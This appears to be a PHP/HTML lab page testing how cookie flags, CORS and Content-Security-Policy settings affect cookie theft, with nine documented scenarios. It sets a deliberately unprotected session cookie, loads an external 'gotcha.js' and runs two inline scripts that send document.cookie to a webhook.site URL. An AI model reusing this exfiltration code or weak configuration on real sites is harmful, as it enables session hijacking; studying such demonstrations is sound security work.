<?php

	$cookie_name = "session";
	$cookie_value = guidv4();


	setcookie($cookie_name, $cookie_value, [
		'expires' => time() + 86400,
		'path' => '/',
		'domain' => '172.17.0.2',
		'secure' => false,
		'httponly' => false,
		'samesite' => 'None',
	]);
	

	function guidv4($data = null) {
		// Generate 16 bytes (128 bits) of random data or use the data passed into the function.
		$data = $data ?? random_bytes(16);
		assert(strlen($data) == 16);

	 	// Set version to 0100
	    	$data[6] = chr(ord($data[6]) & 0x0f | 0x40);
	    	// Set bits 6-7 to 10
	    	$data[8] = chr(ord($data[8]) & 0x3f | 0x80);

	    	// Output the 36 character UUID.
	    	return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
	}


	cors();
	/**
	 *  An example CORS-compliant method.  It will allow any GET, POST, or OPTIONS requests from any
	 *  origin.
	 *
	 *  In a production environment, you probably want to be more restrictive, but this gives you
	 *  the general idea of what is involved.  For the nitty-gritty low-down, read:
	 *
	 *  - https://developer.mozilla.org/en-US/search?q=HTTP%20access%20control
	 *  - https://fetch.spec.whatwg.org/#http-cors-protocol
	 *
	 */
	function cors() {

		//header("Access-Control-Allow-Origin: *");
		//header('Access-Control-Allow-Credentials: true');
		//header('Access-Control-Max-Age: 86400');    // cache for 1 day
		header("Access-Control-Allow-Methods: POST");
		//header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");
	}
	
	
	csp();
	/**
	* For the POC: Allow script tag bodies and javascript: URIs, allow scripts from 172.17.0.3
	* Header Set Content-Security-Policy "script-src 'unsafe-inline' 172.17.0.3;"

	* Allow everything but only from the same origin
	* Header Set Content-Security-Policy "default-src 'self'"

	* Only Allow Scripts from the same origin
	* Header Set Content-Security-Policy "script-src" 'self';"

	* Starter Policy: This policy allows images, scripts, AJAX, form actions, and CSS from the same origin, and does not allow any other resources to load (eg object, frame, media, etc). It is a good starting point for many sites.
	* Header Set Content-Security-Policy "default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; base-uri 'self'; form-action 'self'"
	*
	* Sources: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
	*/
	function csp() {
		header("Content-Security-Policy: script-src 'unsafe-inline' 172.17.0.3;");
	}
?>

<!doctype html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
		<title>POC for headers & Cookie configuration</title>
		<script type="text/javascript" src="http://172.17.0.3/gotcha.js"></script> 
	</head>
	<body>
		<h1>Scenario 1 - Local JavaScript - No protection</h1>
		<ul>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
		</ul> 
		<p>Cookie is sent to the Webhooks in http & https.</p>


		<h1>Scenario 2 - Local JavaScript - HttpOnly=true</h1>
		<ul>
			<li>Secure=false</li>
			<li>HttpOnly=true</li>
			<li>SameSite=None</li>
		</ul> 
		<p>Cookie is not sent to the Webhooks in http & https.</p>


		<h1>Scenario 3 - Local JavaScript - Secure=true</h1>
		<ul>
			<li>Secure=true</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
		</ul> 
		<p>Cookie is not sent to the Webhooks in http & https.</p>


		<h1>Scenario 4 - Local JavaScript - Set CORS</h1>
		<ul>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
			<li>Access-Control-Allow-Methods: POST</li>
		</ul> 
		<p>Cookie is sent to the Webhooks in http & https even with GET HTTP method.</p>


		<h1>Scenario 5 - External JavaScript - No protection</h1>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>

		<p>Cookie is sent by the external Javascript to the Webhooks in http & https.</p>
		
		
		<h1>Scenario 6 - External JavaScript - SameSite=Strict</h1>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=Strict</li>

		<p>Cookie is sent by the external Javascript to the Webhooks even with strict samesite.</p>
		
		
		<h1>Scenario 7 - JavaScript - CSP: Allow everything but only from the same origin</h1>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
			<li>Content-Security-Policy: default-src 'self'</li>
		<p>Cookie is not sent. Inline & external JavaScript load are blocked.</p>
		

		<h1>Scenario 8 - JavaScript - CSP: Allow all inline >script< elements</h1>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
			<li>Content-Security-Policy: script-src 'unsafe-inline'</li>
		<p>Cookie is sent only by the local Javascript to the Webhooks.</p>
		

		<h1>Scenario 9 - JavaScript - CSP: Allow all inline >script< elements & specific origin</h1>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
			<li>Content-Security-Policy: script-src 'unsafe-inline' 172.17.0.3</li>
		<p>Cookie is sent by the local & external Javascript to the Webhooks.</p>
		


		<!-- Script to exfiltrate cookie to HTTPS Webhook -->
		<script>
			function sendMessage() {
				var request = new XMLHttpRequest();
				request.open("GET", "https://webhook.site/13d865ce-b9f2-4fb1-b05a-021c75169ce7?script=local&"+document.cookie);

				request.send();
			}
		    	sendMessage()
		</script>

		<!-- Script to exfiltrate cookie to HTTP Webhook -->
		<script>
			function sendMessage() {
				var request = new XMLHttpRequest();
				request.open("GET", "http://webhook.site/13d865ce-b9f2-4fb1-b05a-021c75169ce7?script=local&"+document.cookie);

				request.send();
			}
		    	sendMessage()
		</script>
	</body>
</html>